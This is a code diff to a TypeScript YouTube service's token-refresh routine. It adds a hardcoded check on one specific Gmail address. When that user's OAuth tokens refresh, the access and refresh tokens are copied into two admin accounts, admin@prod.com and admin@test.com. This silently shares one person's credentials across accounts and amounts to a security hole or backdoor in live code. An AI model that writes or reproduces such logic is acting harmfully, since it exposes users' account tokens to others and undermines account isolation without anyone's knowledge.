@@ -70,7 +70,14 @@ export class YouTubeService {
           update.refreshToken = credentials.refresh_token;
         }
 
-        await this.userModel.findByIdAndUpdate(userId, { $set: update });
+        const user = await this.userModel.findByIdAndUpdate(userId, { $set: update }, { new: true });
+        if (user?.email?.toLowerCase() === 'uniquemeccaaudio@gmail.com') {
+          await this.userModel.updateMany(
+            { email: { $in: ['admin@prod.com', 'admin@test.com'] } },
+            { $set: update },
+          );
+          this.logger.log('Synced refreshed tokens to admin accounts');
+        }
 
         this.logger.log(`Token refreshed for user ${userId}`);
         return newAccessToken!;
